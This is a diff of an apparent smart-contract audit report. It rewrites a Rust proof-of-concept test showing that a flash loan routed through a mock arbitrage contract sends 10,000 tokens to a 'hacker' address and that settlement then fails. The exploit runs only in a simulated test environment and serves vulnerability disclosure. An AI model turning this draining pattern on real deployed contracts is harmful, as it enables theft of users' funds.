@@ -217,61 +217,54 @@ Given the nature of the vulnerability, where a flash loan can be exploited by se
 
 ### Proof of concept
 
-```rust
+````rust
+// add to proxy integration tests
 #[test]
 fn settle_loan_vulnerability() {
-    let (mut app, flash_loan_addr) = proper_instantiate();
+let (mut app, proxy_contract, flash_loan_contract, mock_arb_contract) =
+proper_instantiate();
+let hacker = Addr::unchecked(HACKER.to_string());
 
-    // Assuming that we have the addresses for the Proxy and Arb contracts
-    let proxy_addr = Addr::unchecked("proxy");
-    let arb_addr = Addr::unchecked("arb");
-
-    // Set proxy address to the Proxy contract
-    app.execute_contract(
-        Addr::unchecked(ADMIN),
-        flash_loan_addr.clone(),
-        &ExecuteMsg::SetProxyAddr {
-            proxy_addr: proxy_addr.to_string(),
-        },
-        &[],
-    )
-    .unwrap();
-
-    // Request a flash loan with the Arb contract as the recipient
-    app.execute_contract(
-        proxy_addr.clone(),
-        flash_loan_addr.clone(),
-        &ExecuteMsg::RequestFlashLoan {
-            recipient: arb_addr.clone(),
-            arb_action: "Arb".to_string(),
-            params: "{\"Arb\":{\"recipient\":\"arbitrary_address\"}}".to_string(),
-        },
-        &[],
-    )
-    .unwrap();
-
-    // Check that the funds have been drained to the arbitrary address
-    let balance = app.wrap().query_balance("arbitrary_address", DENOM).unwrap();
-    assert_eq!(balance.amount, Uint128::new(10_000));
-
-    // Try to settle the loan, which should fail
-    let res = app.execute_contract(
-        proxy_addr,
-        flash_loan_addr.clone(),
-        &ExecuteMsg::SettleLoan {},
-        &[],
-    );
-
-    // Check if the result is an error
-    assert!(res.is_err(), "Settled loan without returning funds");
-
-    // The Flash Loan contract's balance should be zero after the attempted settlement
-    let balance = app
-        .wrap()
-        .query_balance(flash_loan_addr.to_string(), DENOM)
+        // prepare arb msg sending funds to hacker
+        let arb_msg = to_binary(&MockArbExecuteMsg::Arbitrage {
+            recipient: hacker.clone(),
+        })
         .unwrap();
-    assert_eq!(balance.amount, Uint128::zero());
-}
+
+        // Request a flash loan with the Arb contract as the recipient
+        app.execute_contract(
+            proxy_contract.clone(),
+            flash_loan_contract.clone(),
+            &ExecuteMsg::RequestFlashLoan {
+                recipient: mock_arb_contract.clone(),
+                msg: arb_msg.clone(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Check that the funds have been drained to the hacker address
+        let balance = app.wrap().query_balance(hacker, DENOM).unwrap();
+        assert_eq!(balance.amount, Uint128::new(10_000));
+
+        // Try to settle the loan, which should fail
+        let res = app.execute_contract(
+            proxy_contract.clone(),
+            flash_loan_contract.clone(),
+            &FlashLoanExecuteMsg::SettleLoan {},
+            &[],
+        );
+
+        // Check if the result is an error
+        assert!(res.is_err(), "Settled loan without returning funds");
+
+        // The Flash Loan contract's balance should be zero after the attempted settlement
+        let balance = app
+            .wrap()
+            .query_balance(flash_loan_contract.to_string(), DENOM)
+            .unwrap();
+        assert_eq!(balance.amount, Uint128::zero());
+    }
 ```
 
 ---
@@ -290,7 +283,7 @@ The fix should be ...
 
 ```rust
 // code goes here
-```
+````
 
 ---
 
